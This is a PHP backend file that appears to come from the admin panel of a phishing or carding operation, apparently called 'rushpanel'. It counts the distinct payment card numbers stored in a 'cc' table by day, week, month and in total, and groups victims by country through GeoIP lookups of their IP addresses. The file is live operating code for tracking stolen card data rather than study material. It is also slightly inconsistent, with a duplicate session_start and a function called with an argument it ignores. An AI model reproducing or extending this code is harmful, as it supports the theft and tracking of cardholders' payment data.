<?php
session_start();

if (!isset($_SESSION['user_logged_in'])) {
    header('Location: ../login.php');
    exit();
}
// fetch_statistics.php

session_start();
require 'config.php'; 
include __DIR__ . '/../vendor/autoload.php';
function getCardsCount($db, $interval) {
    $query = "SELECT COUNT(DISTINCT payment_cc_number) FROM cc WHERE payment_cc_number IS NOT NULL AND date >= (CURDATE() - INTERVAL $interval)";
    $result = $db->query($query);
    return $result ? $result->fetch_row()[0] : 0;
}

function getTotalCardsCount($db) {
    $query = "SELECT * FROM `cc` WHERE `payment_cc_number` IS NOT NULL";
    $result = $db->query($query);
    return $result ? $result->num_rows : 0;
}

$totalCount = getTotalCardsCount($db);

function getTodayCardsCount($db) {
    $query = "SELECT COUNT(DISTINCT payment_cc_number) FROM cc WHERE payment_cc_number IS NOT NULL AND date >= CURDATE()";
    $result = $db->query($query);
    return $result ? $result->fetch_row()[0] : 0;
}

function getYesterdayCardsCount($db) {
    $query = "SELECT COUNT(DISTINCT payment_cc_number) FROM cc WHERE payment_cc_number IS NOT NULL AND date >= DATE_SUB(CURDATE(), INTERVAL 1 DAY) AND date < CURDATE()";
    $result = $db->query($query);
    return $result ? $result->fetch_row()[0] : 0;
}

function getWeeklyCardsCount($db) {
    return getCardsCount($db, '1 WEEK');
}

function getMonthlyCardsCount($db) {
    return getCardsCount($db, '1 MONTH');
}

function getUsersByCountry($db) {
    $query = "SELECT ip, COUNT(DISTINCT payment_cc_number) AS count FROM cc WHERE payment_cc_number IS NOT NULL GROUP BY ip";
    $result = $db->query($query);

    $reader = new \GeoIp2\Database\Reader('/var/www/be2l.xyz/rushpanel_2/geoip/GeoLite2-Country.mmdb');

    $data = [];
    $unknownIpAddresses = [];

    while ($result && $row = $result->fetch_assoc()) {
        $ipAddress = $row['ip'];
        $count = $row['count'];

        try {
            $record = $reader->country($ipAddress);
            $countryName = $record->country->name;

            // Переименовываем "United States" в "United States of America"
            if ($countryName == "United States") {
                $countryName = "United States of America";
            }

            $data[$countryName] = ($data[$countryName] ?? 0) + $count;
        } catch (\GeoIp2\Exception\AddressNotFoundException $e) {
            $unknownIpAddresses[] = $ipAddress;
            $data['Unknown'] = ($data['Unknown'] ?? 0) + $count;
        }
    }

    if (!empty($unknownIpAddresses)) {
        $logMessage = "Unknown IP addresses: " . implode(", ", $unknownIpAddresses);
        error_log($logMessage);
    }

    $reader->close();

    return $data;
}


$todayCount = getTodayCardsCount($db);
$yesterdayCount = getYesterdayCardsCount($db);
$weeklyCount = getWeeklyCardsCount($db);
$monthlyCount = getMonthlyCardsCount($db);
$countryStats = getUsersByCountry($db);

arsort($countryStats);

$period = $_GET['period'] ?? 'total';

// Предполагается, что у вас уже есть функции для получения данных за разные периоды
function getDataByPeriod($db, $period) {
    switch ($period) {
        case 'today':
            return getTodayCardsCount($db);
        case 'yesterday':
            return getYesterdayCardsCount($db);
        case 'week':
            return getWeeklyCardsCount($db);
        case 'month':
            return getMonthlyCardsCount($db);
        case 'total':
        default:
            return getTotalCardsCount($db);
    }
}

$countryStats = getUsersByCountry($db, $period); // Вы должны модифицировать эту функцию, чтобы она принимала $period и возвращала данные за этот период.

echo json_encode(['countryStats' => $countryStats]);
